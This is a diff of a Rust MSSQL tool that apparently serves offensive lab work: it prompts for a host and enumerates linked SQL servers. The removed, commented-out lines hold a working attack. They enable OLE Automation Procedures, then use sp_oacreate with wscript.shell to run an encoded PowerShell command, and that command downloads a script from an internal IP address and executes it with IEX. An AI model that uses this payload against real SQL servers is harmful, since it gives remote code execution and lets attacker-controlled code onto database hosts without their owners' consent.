@@ -6,7 +6,6 @@ use tiberius::{Config, AuthMethod, Client, Query, QueryStream, Row};
 
 async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
     let mut config: Config = Config::new();
-    //config.host("appsrv01.corp1.com"); // dc01
     println!("Enter FQDN of host:");
     let fqdn: String = get_input();
 
@@ -271,14 +270,4 @@ async fn main() {
             println!("[!] No linked SQL servers found!");
         }
     }
-
-    // println!("[+] Enabling OLE Automation Procedures");
-    // query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
-    // execute_query(&mut conn, &query).await;
-
-    // println!("[+] Executing command");
-    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
-    // execute_query(&mut conn, &query).await;
-
-        
 }
